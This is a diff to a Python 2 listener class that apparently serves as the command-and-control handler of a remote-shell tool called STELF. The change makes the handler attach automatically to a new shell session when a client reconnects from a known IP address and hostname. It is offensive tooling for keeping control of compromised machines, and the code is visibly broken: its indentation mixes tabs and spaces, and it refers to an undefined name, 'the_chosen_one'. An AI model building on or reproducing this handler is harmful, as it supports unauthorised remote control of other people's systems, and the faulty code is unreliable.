@@ -397,7 +397,8 @@ class Handler:
 		self.sock.listen(5)
 	
 		self.clients = []
-		
+	        self.dup_session = 9040
+
 		self.interacting = False
 		self.current_id = 0
 		
@@ -442,11 +443,13 @@ class Handler:
 				hostname, admin = cli.recv(4096).split("|")
 				c = Client(id, cli, address, port, aes, hostname, admin)
 				
-				self.clients.append(c)
-                                for client in self.clients:
-                                    if client.hostname == hostname and client.ip == address:
-                                        print "Shell from existing IP + Hostname has been spawned..\n"
 
+                                for client in self.clients:
+                                    if client.hostname == hostname and client.ip == address and not self.interacting:
+                                        print "Attaching to new session"
+                                        self.dup_session = c.id
+
+				self.clients.append(c)
 				if not self.interacting:
 					sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
 					print INFO + "STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n"
@@ -460,6 +463,19 @@ class Handler:
 		t.daemon = True
 		t.start()
 		while True:
+		        if self.dup_session != 9040:
+                            self.interacting = True
+                            try:
+                                dup = [c for c in self.clients if c.id == int(self.dup_session)][0]
+                                self.dup_session = 9040
+                            except:
+                                print BAD + "No such client."
+                                continue
+
+                            if not dup.interact(): 
+                                self.clients.remove(the_chosen_one)
+                                self.interacting = False
+
 			try: user_input = raw_input(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> ")
 			except KeyboardInterrupt:
 				print "\n" + GOOD + "Bye!"
